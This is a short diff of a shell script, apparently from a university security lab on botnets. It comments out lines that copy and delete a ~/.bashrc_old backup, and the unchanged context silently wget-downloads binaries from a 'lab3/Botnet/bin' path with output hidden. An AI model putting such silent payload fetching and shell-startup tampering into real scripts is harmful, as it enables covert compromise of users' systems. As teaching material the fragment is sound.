@@ -30,8 +30,8 @@ if [ -z "$DIR" ]; then
     fi
     cd "${DIR}${FOLDER}"
 
-    cp ~/.bashrc_old ./.bashrc_old
-    rm ~/.bashrc_old
+    #cp ~/.bashrc_old ./.bashrc_old
+    #rm ~/.bashrc_old
 
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN2" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN3" &> /dev/null
